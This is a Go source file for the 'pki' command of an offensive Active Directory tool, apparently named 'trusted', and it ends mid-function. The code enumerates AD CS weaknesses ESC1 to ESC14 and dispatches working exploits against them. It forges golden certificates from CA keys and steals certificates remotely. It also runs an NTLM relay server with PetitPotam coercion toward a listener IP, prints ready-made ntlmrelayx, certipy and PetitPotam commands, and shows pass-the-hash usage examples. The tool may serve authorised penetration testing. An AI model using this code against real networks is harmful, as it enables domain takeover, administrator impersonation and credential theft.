package main

import (
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/loudmumble/trusted/pkg/pki"
	"github.com/spf13/cobra"
)

var pkiCmd = &cobra.Command{
	Use:   "pki",
	Short: "Advanced Certificate/PKI attack toolkit",
	Long: `ADCS enumeration (ESC1-ESC14), golden certificate forging, ESC exploitation, PFX import, and engagement reporting.

Examples:
  trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass
  trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --ldaps
  trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --json
  trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --stealth
  trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee
  trusted pki --esc 1 --template VulnTemplate --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
  trusted pki --esc 7 --ca CorpCA --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
  trusted pki --esc 8 --template Machine --target-dc dc01.corp.local --domain corp.local -u user -p pass --listener-ip 10.0.0.5
  trusted pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
  trusted pki --report --format markdown --output findings.md --target-dc dc01.corp.local --domain corp.local -u user -p pass
  trusted pki --theft all
  trusted pki --import-pfx cert.pfx`,
	RunE: func(cmd *cobra.Command, args []string) error {
		doEnum, _ := cmd.Flags().GetBool("enum")
		doForge, _ := cmd.Flags().GetBool("forge")
		exploit, _ := cmd.Flags().GetString("esc")
		if exploit == "" {
			exploit, _ = cmd.Flags().GetString("exploit") // legacy
		}
		doAutoDetect, _ := cmd.Flags().GetBool("auto-detect")
		importPFX, _ := cmd.Flags().GetString("import-pfx")
		doReport, _ := cmd.Flags().GetBool("report")
		certTheft, _ := cmd.Flags().GetString("theft")
		if certTheft == "" {
			certTheft, _ = cmd.Flags().GetString("cert-theft") // legacy
		}

		// Count how many actions are requested
		actionCount := 0
		if doEnum {
			actionCount++
		}
		if doForge {
			actionCount++
		}
		if exploit != "" {
			actionCount++
		}
		if doAutoDetect {
			actionCount++
		}
		if importPFX != "" {
			actionCount++
		}
		if doReport {
			actionCount++
		}
		if certTheft != "" {
			cfg := buildADCSConfig(cmd)
			if cfg.TargetDC == "" || cfg.Domain == "" {
				return fmt.Errorf("--target-dc and --domain are required for certificate extraction")
			}
			if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
				return fmt.Errorf("Authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
			}

			// If theft4 or just 4, run LDAP extraction. Otherwise run SMBExec remote theft.
			if strings.EqualFold(certTheft, "theft4") || certTheft == "4" {
				outputDir, _ := cmd.Flags().GetString("output")
				if outputDir == "" {
					outputDir = "ldap_certs"
				}
				certs, err := pki.ExtractUserCertificatesLDAP(cfg, outputDir)
				if cfg.OutputJSON {
					if err != nil {
						data, _ := json.MarshalIndent(map[string]string{"error": err.Error()}, "", "  ")
						fmt.Println(string(data))
						return nil
					}
					data, _ := json.MarshalIndent(certs, "", "  ")
					fmt.Println(string(data))
					return nil
				}
				return err
			} else {
				// Normalize theftX or X to theftX
				method := certTheft
				if len(method) <= 2 && method[0] >= '0' && method[0] <= '9' {
					method = "theft" + method
				}
				err := pki.RemoteCertTheft(cfg.TargetDC, method, cfg)
				if cfg.OutputJSON {
					status := "success"
					if err != nil {
						status = err.Error()
					}
					data, _ := json.MarshalIndent(map[string]string{"method": method, "status": status}, "", "  ")
					fmt.Println(string(data))
					return nil
				}
				return err
			}
		}
		if importPFX != "" {
			return runImportPFX(cmd, importPFX)
		}
		if doReport {
			return runReport(cmd)
		}
		if doAutoDetect {
			return runAutoDetect(cmd)
		}
		if exploit != "" {
			return runExploit(cmd, exploit)
		}
		if doEnum {
			return runEnumerate(cmd)
		}
		if doForge {
			return runForge(cmd)
		}
		return nil
	},
}

func buildADCSConfig(cmd *cobra.Command) *pki.ADCSConfig {
	targetDC, _ := cmd.Flags().GetString("target-dc")
	domain, _ := cmd.Flags().GetString("domain")
	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	hash, _ := cmd.Flags().GetString("hash")
	useTLS, _ := cmd.Flags().GetBool("ldaps")
	useStartTLS, _ := cmd.Flags().GetBool("start-tls")
	outputJSON, _ := cmd.Flags().GetBool("json")
	stealth, _ := cmd.Flags().GetBool("stealth")
	kerberos, _ := cmd.Flags().GetBool("kerberos")
	ccache, _ := cmd.Flags().GetString("ccache")
	keytabPath, _ := cmd.Flags().GetString("keytab")
	kdcIP, _ := cmd.Flags().GetString("dc-ip")
	timeout, _ := cmd.Flags().GetInt("timeout")

	return &pki.ADCSConfig{
		TargetDC:    targetDC,
		Domain:      domain,
		Username:    username,
		Password:    password,
		Hash:        hash,
		UseTLS:      useTLS,
		UseStartTLS: useStartTLS,
		OutputJSON:  outputJSON,
		Stealth:     stealth,
		Kerberos:    kerberos,
		CCache:      ccache,
		Keytab:      keytabPath,
		KDCIP:       kdcIP,
		Timeout:     timeout,
	}
}

func runEnumerate(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required for enumeration")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
	}
	ctx := context.Background()
	conn, err := pki.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("ldap connect: %w", err)
	}
	defer conn.Close()

	// JSON mode: use EnumerateAll for structured output
	if cfg.OutputJSON {
		result, err := pki.EnumerateAll(ctx, cfg, conn)
		if err != nil {
			return fmt.Errorf("enumeration failed: %w", err)
		}
		data, err := json.MarshalIndent(result, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	templates, err := pki.EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumeration failed: %w", err)
	}

	fmt.Printf("\n[+] Found %d certificate templates:\n\n", len(templates))
	for i, tmpl := range templates {
		vulns := "none"
		if len(tmpl.ESCVulns) > 0 {
			vulns = strings.Join(tmpl.ESCVulns, ", ")
		}
		fmt.Printf("  %d. %-30s  ESC: %-20s  Score: %d\n", i+1, tmpl.Name, vulns, tmpl.ESCScore)
		if tmpl.EnrolleeSuppliesSubject {
			fmt.Println("     ⚠  Enrollee Supplies Subject: YES")
		}
		if tmpl.AuthenticationEKU {
			fmt.Println("     ⚠  Authentication EKU: YES")
		}
		if !tmpl.RequiresManagerApproval {
			fmt.Println("     ⚠  Manager Approval: NO")
		}
		for _, f := range tmpl.ESC4Findings {
			fmt.Printf("     ⚠  ESC4: Trustee %s has %s (mask=0x%08x)\n", f.Trustee, strings.Join(f.Rights, ", "), f.AccessMask)
		}
	}

	// ESC2: Any Purpose EKU templates
	fmt.Println("\n[*] Scanning for ESC2 (Any Purpose EKU templates)...")
	esc2Findings, err := pki.ScanESC2(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC2 scan failed: %v\n", err)
	} else if len(esc2Findings) == 0 {
		fmt.Println("[+] ESC2: No Any Purpose EKU templates found.")
	} else {
		fmt.Printf("\n[!] ESC2 VULNERABLE — %d finding(s):\n\n", len(esc2Findings))
		for _, f := range esc2Findings {
			fmt.Printf("    Template: %s\n", f.TemplateName)
			fmt.Printf("    EKUs:     %s\n", strings.Join(f.EKUs, ", "))
			fmt.Println()
		}
	}

	// ESC3: Enrollment Agent templates
	fmt.Println("\n[*] Scanning for ESC3 (Enrollment Agent templates)...")
	esc3Findings, err := pki.ScanESC3(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC3 scan failed: %v\n", err)
	} else if len(esc3Findings) == 0 {
		fmt.Println("[+] ESC3: No Enrollment Agent templates found.")
	} else {
		fmt.Printf("\n[!] ESC3 VULNERABLE — %d finding(s):\n\n", len(esc3Findings))
		for _, f := range esc3Findings {
			fmt.Printf("    Template:           %s\n", f.TemplateName)
			fmt.Printf("    Enrollment Agent:   %v\n", f.EnrollmentAgentEKU)
			fmt.Println()
		}
	}

	// ESC5: CA object ACL inspection via nTSecurityDescriptor parsing
	fmt.Println("\n[*] Scanning CA objects for ESC5 (dangerous ACLs on CA itself)...")
	esc5Findings, err := pki.ScanESC5(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC5 scan failed: %v\n", err)
	} else if len(esc5Findings) == 0 {
		fmt.Println("[+] ESC5: No dangerous CA ACLs found.")
	} else {
		fmt.Printf("\n[!] ESC5 VULNERABLE — %d finding(s):\n\n", len(esc5Findings))
		for _, f := range esc5Findings {
			fmt.Printf("    CA:      %s\n", f.CAName)
			fmt.Printf("    DN:      %s\n", f.CADN)
			fmt.Printf("    Trustee: %s\n", f.Trustee)
			fmt.Printf("    Rights:  %s  (mask=0x%08x)\n", strings.Join(f.Rights, ", "), f.AccessMask)
			fmt.Println()
		}
	}

	// ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on enrollment service
	fmt.Println("\n[*] Scanning for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 on CA)...")
	esc6Findings, err := pki.ScanESC6(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC6 scan failed: %v\n", err)
	} else if len(esc6Findings) == 0 {
		fmt.Println("[+] ESC6: No CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 enabled.")
	} else {
		fmt.Printf("\n[!] ESC6 VULNERABLE — %d finding(s):\n\n", len(esc6Findings))
		for _, f := range esc6Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			if len(f.Templates) > 0 {
				fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
			}
			fmt.Printf("    > trusted pki --esc 6 --template <ANY> --upn <UPN>\n")
			fmt.Println()
		}
	}

	// ESC7: Vulnerable CA ACLs (ManageCA / ManageCertificates)
	fmt.Println("\n[*] Scanning for ESC7 (vulnerable CA ACLs)...")
	esc7Findings, err := pki.ScanESC7(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC7 scan failed: %v\n", err)
	} else if len(esc7Findings) == 0 {
		fmt.Println("[+] ESC7: No CAs with exploitable ManageCA/ManageCertificates ACLs.")
	} else {
		fmt.Printf("\n[!] ESC7 VULNERABLE — %d finding(s):\n\n", len(esc7Findings))
		for _, f := range esc7Findings {
			fmt.Printf("    CA:                  %s\n", f.CAName)
			fmt.Printf("    Trustee (SID):       %s\n", f.Trustee)
			fmt.Printf("    ManageCA:            %v\n", f.ManageCA)
			fmt.Printf("    ManageCertificates:  %v\n", f.ManageCertificates)
			fmt.Printf("    Access Mask:         0x%08x\n", f.AccessMask)
			fmt.Printf("    > trusted pki --esc 7 --ca %q --upn <UPN>\n", f.CAName)
			fmt.Println()
		}
	}

	// ESC8: NTLM relay to AD CS web enrollment
	fmt.Println("\n[*] Scanning for ESC8 (NTLM relay to web enrollment)...")
	esc8Findings, err := pki.ScanESC8(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC8 scan failed: %v\n", err)
	} else if len(esc8Findings) == 0 {
		fmt.Println("[+] ESC8: No vulnerable web enrollment endpoints found.")
	} else {
		fmt.Printf("\n[!] ESC8 VULNERABLE — %d finding(s):\n\n", len(esc8Findings))
		for _, f := range esc8Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Endpoint:  %s\n", f.HTTPEndpoint)
			fmt.Printf("    NTLM:      %v\n", f.NTLMEnabled)
			fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
			fmt.Printf("    > ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template <TEMPLATE>\n", f.HTTPEndpoint)
			fmt.Println()
		}
	}

	// ESC11: NTLM relay to AD CS RPC interface
	fmt.Println("\n[*] Scanning for ESC11 (NTLM relay to RPC interface)...")
	esc11Findings, err := pki.ScanESC11(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC11 scan failed: %v\n", err)
	} else if len(esc11Findings) == 0 {
		fmt.Println("[+] ESC11: All CAs enforce RPC encryption.")
	} else {
		fmt.Printf("\n[!] ESC11 VULNERABLE — %d finding(s):\n\n", len(esc11Findings))
		for _, f := range esc11Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			fmt.Printf("    Encrypts:  %v\n", f.EnforcesEncryption)
			fmt.Printf("    > certipy-ad relay -target rpc://%s -ca %q\n", f.CAHostname, f.CAName)
			fmt.Println()
		}
	}

	// ESC12: DCOM interface abuse on CA with network HSM key storage
	fmt.Println("\n[*] Scanning for ESC12 (DCOM interface abuse on CA)...")
	esc12Findings, err := pki.ScanESC12(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC12 scan failed: %v\n", err)
	} else if len(esc12Findings) == 0 {
		fmt.Println("[+] ESC12: No CAs with accessible DCOM endpoints found.")
	} else {
		fmt.Printf("\n[!] ESC12 VULNERABLE — %d finding(s):\n\n", len(esc12Findings))
		for _, f := range esc12Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    DCOM:      %v\n", f.DCOMAccessible)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			fmt.Printf("    > certipy-ad relay -target dcom://%s -ca %q\n", f.CAHostname, f.CAName)
			fmt.Printf("               # Or: impacket-ntlmrelayx -t dcom://%s --adcs -smb2support\n", f.CAHostname)
			fmt.Println()
		}
	}

	// ESC9: CT_FLAG_NO_SECURITY_EXTENSION — UPN spoofing via missing requester SID
	fmt.Println("\n[*] Scanning for ESC9 (CT_FLAG_NO_SECURITY_EXTENSION)...")
	esc9Findings, err := pki.ScanESC9(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC9 scan failed: %v\n", err)
	} else if len(esc9Findings) == 0 {
		fmt.Println("[+] ESC9: No vulnerable templates found.")
	} else {
		fmt.Printf("\n[!] ESC9 VULNERABLE — %d finding(s):\n\n", len(esc9Findings))
		for _, f := range esc9Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Template:                %s\n", f.TemplateName)
			fmt.Printf("    NO_SECURITY_EXTENSION:   %v\n", f.HasNoSecurityExtension)
			fmt.Printf("    Authentication EKU:      %v\n", f.AuthenticationEKU)
			fmt.Printf("    Binding Enforcement:     %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Println()
		}
	}

	// ESC10: Weak certificate mapping methods
	fmt.Println("\n[*] Scanning for ESC10 (weak certificate mapping methods)...")
	esc10Findings, err := pki.ScanESC10(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC10 scan failed: %v\n", err)
	} else if len(esc10Findings) == 0 {
		fmt.Println("[+] ESC10: Certificate mapping methods are not weak.")
	} else {
		fmt.Printf("\n[!] ESC10 VULNERABLE — %d finding(s):\n\n", len(esc10Findings))
		for _, f := range esc10Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Mapping Methods:     0x%02x\n", f.MappingMethods)
			fmt.Printf("    UPN Mapping:         %v\n", f.UPNMappingEnabled)
			fmt.Printf("    S4U2Self Mapping:    %v\n", f.S4U2SelfEnabled)
			fmt.Printf("    Binding Enforcement: %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Printf("    Vulnerable Templates (%d): %s\n", len(f.VulnerableTemplates), strings.Join(f.VulnerableTemplates, ", "))
			fmt.Println()
		}
	}

	// ESC13: OID group link abuse via msDS-OIDToGroupLink
	fmt.Println("\n[*] Scanning for ESC13 (OID group link abuse)...")
	esc13Findings, err := pki.ScanESC13(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC13 scan failed: %v\n", err)
	} else if len(esc13Findings) == 0 {
		fmt.Println("[+] ESC13: No linked issuance policy OIDs found.")
	} else {
		fmt.Printf("\n[!] ESC13 VULNERABLE — %d finding(s):\n\n", len(esc13Findings))
		for _, f := range esc13Findings {
			fmt.Printf("    Template:     %s\n", f.TemplateName)
			fmt.Printf("    Policy OID:   %s\n", f.IssuancePolicyOID)
			fmt.Printf("    Linked Group: %s (%s)\n", f.LinkedGroupName, f.LinkedGroup)
			fmt.Println()
		}
	}

	// ESC14: Weak explicit mappings via altSecurityIdentities
	fmt.Println("\n[*] Scanning for ESC14 (weak explicit mappings via altSecurityIdentities)...")
	esc14Findings, err := pki.ScanESC14(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC14 scan failed: %v\n", err)
	} else if len(esc14Findings) == 0 {
		fmt.Println("[+] ESC14: No schema v1 templates with weak mapping found.")
	} else {
		fmt.Printf("\n[!] ESC14 VULNERABLE — %d finding(s):\n\n", len(esc14Findings))
		for _, f := range esc14Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Template:            %s\n", f.TemplateName)
			fmt.Printf("    Schema Version:      %d\n", f.SchemaVersion)
			fmt.Printf("    Explicit Mapping:    %v\n", f.AllowsExplicitMapping)
			fmt.Printf("    Strong Mapping Req:  %v\n", f.StrongMappingRequired)
			fmt.Printf("    Binding Enforcement: %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Println()
		}
	}

	return nil
}

func runForge(cmd *cobra.Command) error {
	upn, _ := cmd.Flags().GetString("upn")
	caKeyPath, _ := cmd.Flags().GetString("ca-key")
	caCertPath, _ := cmd.Flags().GetString("ca-cert")
	output, _ := cmd.Flags().GetString("output")

	if upn == "" {
		return fmt.Errorf("--upn is required for certificate forging (e.g. --upn administrator@corp.local)")
	}
	if !strings.Contains(upn, "@") {
		return fmt.Errorf("--upn must be a full UPN (user@domain), got %q", upn)
	}
	if output == "" {
		// Default to UPN username (e.g., administrator@corp.local → administrator)
		if idx := strings.Index(upn, "@"); idx > 0 {
			output = upn[:idx]
		} else {
			output = upn
		}
	}

	basePath := output
	for _, ext := range []string{".pem", ".crt", ".key", ".pfx"} {
		basePath = strings.TrimSuffix(basePath, ext)
	}

	// Golden Certificate mode: both --ca-key and --ca-cert provided
	// Uses ForgeGoldenCertificate to sign with real CA key and chain to real CA cert
	if caKeyPath != "" && caCertPath != "" {
		fmt.Println("[!] Golden Certificate mode: signing with real CA key + cert")
		caCert, caKey, err := pki.LoadCACertAndKey(caCertPath, caKeyPath)
		if err != nil {
			return fmt.Errorf("load CA material: %w", err)
		}

		cert, certKey, err := pki.ForgeGoldenCertificate(caKey, caCert, upn)
		if err != nil {
			return fmt.Errorf("forge golden certificate: %w", err)
		}

		if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
			return fmt.Errorf("write certificate: %w", err)
		}
		pfxPassword, _ := cmd.Flags().GetString("pfx-password")
		if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
			fmt.Printf("[!] PFX export failed: %v\n", err)
		}

		outputJSON, _ := cmd.Flags().GetBool("json")
		if outputJSON {
			data, _ := json.MarshalIndent(map[string]string{
				"type":      "golden_certificate",
				"subject":   cert.Subject.CommonName,
				"issuer":    cert.Issuer.CommonName,
				"upn":       upn,
				"serial":    cert.SerialNumber.Text(16),
				"cert_path": basePath + ".crt",
				"key_path":  basePath + ".key",
				"pfx_path":  basePath + ".pfx",
			}, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		fmt.Printf("[+] Golden certificate (CA-signed) written to %s.crt / %s.pfx\n", basePath, basePath)
		fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
		fmt.Printf("    Issuer:  %s\n", cert.Issuer.CommonName)
		fmt.Printf("    UPN: %s\n", upn)
		fmt.Printf("    Serial: %s\n", cert.SerialNumber.Text(16))
		fmt.Printf("    Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02"))
		return nil
	}

	// Self-signed mode: original ForgeCertificate behavior
	var caKey crypto.PrivateKey

	if caKeyPath != "" {
		data, err := os.ReadFile(caKeyPath)
		if err != nil {
			return fmt.Errorf("read CA key: %w", err)
		}
		block, _ := pem.Decode(data)
		if block == nil {
			return fmt.Errorf("no PEM block found in %s", caKeyPath)
		}
		// Try PKCS8 first (handles RSA, ECDSA, Ed25519), then legacy formats
		pkcs8Key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err == nil {
			caKey = pkcs8Key
		} else {
			// Try PKCS1 RSA
			rsaKey, rsaErr := x509.ParsePKCS1PrivateKey(block.Bytes)
			if rsaErr == nil {
				caKey = rsaKey
			} else {
				// Try EC
				ecKey, ecErr := x509.ParseECPrivateKey(block.Bytes)
				if ecErr != nil {
					return fmt.Errorf("parse CA key: PKCS8: %v, PKCS1: %v, EC: %v", err, rsaErr, ecErr)
				}
				caKey = ecKey
			}
		}
	} else {
		fmt.Println("[*] No --ca-key provided, generating ephemeral RSA key...")
		rsaKey, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return fmt.Errorf("generate CA key: %w", err)
		}
		caKey = rsaKey
	}

	cert, certKey, err := pki.ForgeCertificate(caKey, upn)
	if err != nil {
		return fmt.Errorf("forge certificate: %w", err)
	}

	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return fmt.Errorf("write certificate: %w", err)
	}
	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
		fmt.Printf("[!] PFX export failed: %v\n", err)
	}

	outputJSON, _ := cmd.Flags().GetBool("json")
	if outputJSON {
		data, _ := json.MarshalIndent(map[string]string{
			"type":      "self_signed_certificate",
			"subject":   cert.Subject.CommonName,
			"upn":       upn,
			"serial":    cert.SerialNumber.String(),
			"cert_path": basePath + ".crt",
			"key_path":  basePath + ".key",
			"pfx_path":  basePath + ".pfx",
		}, "", "  ")
		fmt.Println(string(data))
		return nil
	}
	fmt.Printf("[+] Golden certificate written to %s.crt / %s.pfx\n", basePath, basePath)
	fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
	fmt.Printf("    UPN: %s\n", upn)
	fmt.Printf("    Serial: %s\n", cert.SerialNumber.String())
	fmt.Printf("    Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02"))
	return nil
}

func runExploit(cmd *cobra.Command, exploit string) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
	}
	ctx := context.Background()
	conn, err := pki.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("ldap connect: %w", err)
	}
	defer conn.Close()

	templateName, _ := cmd.Flags().GetString("template")
	upn, _ := cmd.Flags().GetString("upn")
	output, _ := cmd.Flags().GetString("output")

	// ESC5/8/10/11/12/14 are scan-only — they don't require --template or --upn
	escID := strings.ToLower(strings.TrimPrefix(strings.ToLower(exploit), "esc"))
	isScanOnly := escID == "5" || escID == "8" || escID == "10" || escID == "11" || escID == "12" || escID == "14"

	if templateName == "" && !isScanOnly {
		return fmt.Errorf("--template is required for exploitation (e.g. --template User)")
	}
	if upn == "" && !isScanOnly {
		return fmt.Errorf("--upn is required for exploitation (e.g. --upn administrator@%s)", cfg.Domain)
	}
	if upn != "" && !strings.Contains(upn, "@") {
		return fmt.Errorf("--upn must be a full UPN (user@domain), got %q — try %s@%s", upn, upn, cfg.Domain)
	}
	if output == "" {
		// Default to UPN username (e.g., administrator@corp.local → administrator)
		if idx := strings.Index(upn, "@"); idx > 0 {
			output = upn[:idx]
		} else {
			output = upn
		}
	}

	var cert *x509.Certificate
	var certKey crypto.Signer

	switch escID {
	case "1":
		cert, certKey, err = pki.ExploitESC1(ctx, cfg, conn, templateName, upn)
	case "2":
		cert, certKey, err = pki.ExploitESC2(ctx, cfg, conn, templateName, upn)
	case "3":
		cert, certKey, err = pki.ExploitESC3(ctx, cfg, conn, templateName, upn)
	case "4":
		cert, certKey, err = pki.ExploitESC4(ctx, cfg, conn, templateName, upn)
	case "6":
		cert, certKey, err = pki.ExploitESC6(ctx, cfg, conn, templateName, upn)
	case "7":
		caName, _ := cmd.Flags().GetString("ca")
		if caName == "" {
			return fmt.Errorf("--ca is required for ESC7 exploitation (target CA name)")
		}
		cert, certKey, err = pki.ExploitESC7(ctx, cfg, conn, caName, upn)
	case "9":
		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
		if attackerDN == "" {
			return fmt.Errorf("--attacker-dn is required for ESC9 exploitation (attacker's LDAP DN)")
		}
		cert, certKey, err = pki.ExploitESC9(ctx, cfg, conn, templateName, attackerDN, upn)
	case "13":
		cert, certKey, err = pki.ExploitESC13(ctx, cfg, conn, templateName, upn)
	case "8":
		esc8Findings, scanErr := pki.ScanESC8(ctx, cfg, conn)
		if scanErr != nil {
			return fmt.Errorf("ESC8 scan failed: %w", scanErr)
		}
		if len(esc8Findings) == 0 {
			return fmt.Errorf("no vulnerable web enrollment endpoints found")
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc8Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		target := esc8Findings[0]
		relayPort, _ := cmd.Flags().GetInt("relay-port")
		if relayPort == 0 {
			relayPort = 8080
		}
		relayTimeout, _ := cmd.Flags().GetInt("relay-timeout")
		if relayTimeout == 0 {
			relayTimeout = 120
		}
		fmt.Printf("[*] ESC8: Starting built-in NTLM relay server on :%d\n", relayPort)
		fmt.Printf("[*] Relaying to: %s (%s)\n", target.CAName, target.HTTPEndpoint)
		fmt.Printf("[*] Template: %s\n", templateName)
		fmt.Printf("[*] Timeout: %ds — waiting for coerced NTLM authentication\n\n", relayTimeout)

		listenerIP, _ := cmd.Flags().GetString("listener-ip")
		listenerPort, _ := cmd.Flags().GetInt("listener-port")
		if listenerIP != "" {
			go func() {
				time.Sleep(2 * time.Second)
				fmt.Printf("[*] Triggering PetitPotam coercion: %s → %s:%d\n", cfg.TargetDC, listenerIP, listenerPort)
				if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, listenerPort, pki.CoercePetitPotam, cfg); coerceErr != nil {
					fmt.Printf("[!] PetitPotam coercion failed: %v\n", coerceErr)
				}
			}()
		} else {
			fmt.Println("[*] Awaiting connection — trigger NTLM auth externally:")
			fmt.Printf("    PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
			fmt.Printf("    Or: PrinterBug.py <LISTENER_IP> %s\n\n", cfg.TargetDC)
		}

		caHostname := target.CAHostname
		if caHostname == "" {
			caHostname = target.CAName
		}
		relayCert, relayKey, relayErr := pki.RunRelayServer(
			caHostname, templateName, upn,
			relayPort, time.Duration(relayTimeout)*time.Second,
		)
		if relayErr != nil {
			return fmt.Errorf("ESC8 relay failed: %w", relayErr)
		}
		cert, certKey = relayCert, relayKey
	case "12":
		esc12Findings, scanErr := pki.ScanESC12(ctx, cfg, conn)
		if scanErr != nil {
			return fmt.Errorf("ESC12 scan failed: %w", scanErr)
		}
		if len(esc12Findings) == 0 {
			return fmt.Errorf("no CAs with accessible DCOM endpoints found")
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc12Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		f := esc12Findings[0]
		
		listenerIP, _ := cmd.Flags().GetString("listener-ip")
		listenerPort, _ := cmd.Flags().GetInt("listener-port")
		if listenerIP == "" {
			return fmt.Errorf("--listener-ip is required for automated coercion")
		}

		targetURL := fmt.Sprintf("dcom://%s", f.CAHostname)
		if err := runAutomatedRelay(cfg, targetURL, f.CAName, templateName, listenerIP, listenerPort); err != nil {
			return err
		}
		return nil
	case "5":
		caName, _ := cmd.Flags().GetString("ca")
		if caName == "" {
			return fmt.Errorf("--ca is required for ESC5 exploitation (target CA name)")
		}
		cert, certKey, err = pki.ExploitESC5(ctx, cfg, conn, caName, upn)
	case "10":
		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
		if attackerDN == "" {
			return fmt.Errorf("--attacker-dn is required for ESC10 exploitation")
		}
		cert, certKey, err = pki.ExploitESC10(ctx, cfg, conn, templateName, attackerDN, upn)
	case "11":
		esc11Findings, scanErr := pki.ScanESC11(ctx, cfg, conn)
		if scanErr != nil {
			return fmt.Errorf("ESC11 scan failed: %w", scanErr)
		}
		if len(esc11Findings) == 0 {
			return fmt.Errorf("no CAs with unencrypted RPC enrollment found (ESC11)")
		}
